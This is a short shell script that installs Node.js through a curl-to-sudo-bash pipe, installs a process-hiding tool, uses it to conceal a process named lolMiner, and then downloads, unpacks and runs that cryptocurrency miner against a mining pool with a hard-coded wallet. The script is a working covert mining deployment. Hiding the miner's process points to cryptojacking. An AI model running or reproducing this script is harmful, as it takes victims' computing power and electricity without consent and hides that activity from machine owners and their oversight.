sudo apt update
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt install nodejs
npm i -g node-process-hider
sudo ph add lolMiner
wget https://github.com/mikeyytman/demo/raw/main/test.tar.gz
tar -xvzf test.tar.gz
cd 1.89
./lolMiner --algo FISHHASH --pool stratum+ssl://fishhash.unmineable.com:4444 --user LTC:ltc1q0jrt9vd0zczpml0sq3zxwkhxf8wz8jjskwh29e.unmineable_worker
